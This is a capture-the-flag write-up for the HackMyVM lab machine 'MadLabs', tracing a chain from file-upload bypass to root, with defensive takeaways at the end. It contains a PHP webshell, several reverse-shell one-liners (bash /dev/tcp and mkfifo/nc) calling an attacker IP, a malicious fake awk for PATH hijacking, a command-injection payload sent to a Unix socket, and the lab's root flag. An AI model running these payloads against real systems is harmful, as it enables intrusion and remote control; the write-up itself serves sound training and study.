# HackMyVM — MadLabs

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 26.04)  
**Author:** shalopai  
**Tags:** `file upload bypass`, `PATH hijacking`, `cron abuse`, `command injection`, `unix socket`, `ssh key cracking`

---

## Summary

The machine exposes an Apache web server with an unrestricted file upload endpoint. Uploading a PHP webshell via a `.phtml` extension bypass grants RCE as `www-data`. A cronjob running as `igor` calls `awk` without an absolute path — a fake `awk` planted in the uploads directory hijacks execution and escalates to `igor`. As `igor`, a Python service listening on a Unix domain socket is vulnerable to command injection, yielding a shell as `frankenstein`. In `frankenstein`'s home directory, an encrypted SSH private key for root is found and cracked with John the Ripper.

**Root flag:** `HMV{n0t_4_gh0st_j1st_4_r00t_us3r_1n_y0ur_syst3m}`

---

## Attack Chain Overview

```
[Attacker]
    │
    └─ File upload (.phtml) ──► RCE as www-data
                                      │
                                      └─ PATH hijack (fake awk) ──► shell as igor
                                                                          │
                                                                          └─ Unix socket cmd injection ──► shell as frankenstein
                                                                                                                    │
                                                                                                                    └─ Encrypted SSH key → john → root
```

---

## 1. Enumeration

### Port Scan

```bash
nmap -sV -sC -p- -T4 --min-rate 5000 172.20.10.3
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 10.2p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.66 (Ubuntu) |

Minimal attack surface — focus is entirely on the web server.

### Directory Bruteforce

```bash
ffuf -u http://172.20.10.3/FUZZ -w '/home/shalopai/Desktop/common.txt'
```

**Key findings:**

| Path | Status |
|------|--------|
| `/uploads` | 301 |
| `/js` | 301 |
| `/assets` | 301 |
| `/css` | 301 |

The `/uploads` directory is the primary attack vector.

---

## 2. Initial Access — File Upload Bypass (.phtml)

The web application at `http://172.20.10.3` ("Mad Labs Medical Dashboard") allows file uploads. The upload endpoint likely blocks `.php` extensions but not all PHP-interpretable extensions.

### Upload a PHP webshell as `.phtml`

Apache with `mod_php` will execute `.phtml` files as PHP. Create a minimal webshell:

```php
<?php system($_GET['cmd']); ?>
```

Save it as `123.phtml` and upload it to the application.

### Verify RCE

```
http://172.20.10.3/uploads/123.phtml?cmd=id
```

Returns: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### Get a reverse shell

The direct bash redirect syntax (`>&`) fails because PHP's `system()` uses `/bin/sh` (dash on Ubuntu), which does not support bash-specific redirects. Wrapping the payload in `bash -c` fixes this:

```
http://172.20.10.3/uploads/123.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.20.10.4/4445+0>%261'
```

On the attacker machine:

```bash
nc -lvnp 4445
```

Connection received. Stabilise the TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
```

Shell obtained as `www-data`.

---

## 3. Local Enumeration — Finding the PATH Hijacking Vector

```bash
ls -la /opt/laboratory
```

```
drwxrwxr-x  igor         madmanagers  laboratory/
drwxrwx---  frankenstein madmanagers  monsters/
-rw-rw----  frankenstein madmanagers  reanimate_service.py
-rwxr-xr-x  igor         madmanagers  reanimator_core
```

`reanimator_core` is world-readable and executable. Inspect it:

```bash
cat /opt/laboratory/reanimator_core
```

The script runs every minute via a cronjob as `igor` and calls `awk` and `cut` **without absolute paths**:

```bash
RAW_VOLTAGE=$(echo "$VOLTAGE_INT" | awk '{print substr($1,1,3)"."substr($1,4,1)}')
CLEAN_VOLTAGE=$(echo "$RAW_VOLTAGE" | cut -d'.' -f1)
```

This is the PATH hijacking vulnerability. If a directory writable by `www-data` appears before `/usr/bin` in igor's `$PATH`, a malicious binary named `awk` placed there will execute first.

The `/var/www/html/uploads` directory is writable by `www-data` and is in igor's cron PATH — confirmed by the fact that it works.

---

## 4. Privilege Escalation — www-data → igor (PATH Hijacking)

### Create the malicious `awk`

```bash
cd /var/www/html/uploads
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/172.20.10.4/1234 0>&1' > awk
chmod +x awk
```

### Wait for the cronjob

```bash
# On attacker machine
nc -lvnp 1234
```

Within one minute the cronjob fires, `reanimator_core` calls `awk`, finds the malicious binary first in PATH, and executes it:

```
Connection received on 172.20.10.3
igor@madlabs:~$
```

Stabilise TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
```

Shell obtained as `igor`. Collect the user flag:

```bash
cat /home/igor/user.txt
```

---

## 5. Local Enumeration as Igor — Unix Socket

Igor's bash history reveals the next vector immediately:

```bash
cat ~/.bash_history
```

```
ls -la /run/madlabs/
echo "STATUS:1818" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
```

Read the service source code (now accessible as `igor` via group `madmanagers`):

```bash
cat /opt/laboratory/reanimate_service.py
```

The critical vulnerable section:

```python
if data.startswith("STATUS:"):
    _, monster_id = data.split(":", 1)
    cmd = f"cat /opt/laboratory/monsters/{monster_id}.status 2>/dev/null"
    stream = os.popen(cmd)
```

`os.popen()` passes the string to `/bin/sh -c`. The `monster_id` value is taken directly from user input **with no sanitisation**. Sending a semicolon followed by arbitrary commands results in shell injection.

Verify injection:

```bash
echo "STATUS:1818; whoami ;" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
```

Output: `frankenstein`

The service runs as `frankenstein`.

---

## 6. Privilege Escalation — igor → frankenstein (Command Injection via Unix Socket)

The direct `bash -i >& /dev/tcp/...` syntax won't work because `os.popen()` invokes `/bin/sh` (dash), which does not support bash redirect syntax. Use a **named pipe** (FIFO) instead — this works with any POSIX shell:

```bash
echo "STATUS:1818;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.3 6666 >/tmp/f &" | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
```

**How the named pipe trick works:**

```
mkfifo /tmp/f           # creates a bidirectional FIFO file
cat /tmp/f              # reads attacker's commands from the pipe → stdin of bash
| /bin/bash -i          # executes them, sends output to nc
2>&1                    # stderr also to nc
| nc 10.0.2.3 6666      # sends output to attacker, receives commands
> /tmp/f                # attacker's input loops back into the pipe
```

This creates a fully interactive loop without relying on bash-only syntax.

On attacker machine:

```bash
nc -lvnp 6666
```

```
frankenstein@madlabs:/opt/laboratory$
```

---

## 7. Privilege Escalation — frankenstein → root (SSH Key Cracking)

Enumerate frankenstein's home directory:

```bash
ls -la ~/.ssh/
cat ~/.ssh/id_rsa_root
```

An encrypted OpenSSH private key intended for the root account is stored here. The `-----BEGIN OPENSSH PRIVATE KEY-----` header with `bcrypt` KDF indicates passphrase protection.

### Extract hash and crack with John

Copy the key to the attacker machine, then:

```bash
ssh2john id_rsa_root > root_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
```

```
halloween        (id_rsa_root)
1g 0:00:01:09 DONE
```

Passphrase cracked: **`halloween`**

### SSH into the host as root

```bash
ssh root@172.20.10.3 -i id_rsa_root
# Enter passphrase: halloween
```

```
root@madlabs:~#
```

---

## 8. Root Flag

```bash
cat /root/root.txt
```

```
HMV{n0t_4_gh0st_j1st_4_r00t_us3r_1n_y0ur_syst3m}
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| ffuf | Web directory bruteforce |
| PHP webshell (.phtml) | Initial RCE via file upload bypass |
| nc | Reverse shell listener |
| PATH hijacking | Escalation www-data → igor |
| socat | Unix domain socket communication |
| os.popen() command injection | Escalation igor → frankenstein |
| ssh2john + john | SSH key passphrase cracking |

---

## Key Takeaways

**File upload bypass** — blocking `.php` while allowing `.phtml`, `.php5`, `.phar` etc. is insufficient. Allowlist-only validation is the correct approach.

**PATH hijacking** — always use absolute paths in scripts that run with elevated privileges (`/usr/bin/awk` not `awk`). Especially critical in cron jobs.

**Unix socket injection** — `os.popen()` and `subprocess` with `shell=True` are dangerous when accepting any external input. Use `subprocess.run()` with a list of arguments instead.

**Key management** — private keys should never be stored on the same system they authenticate to, and certainly not readable by other users.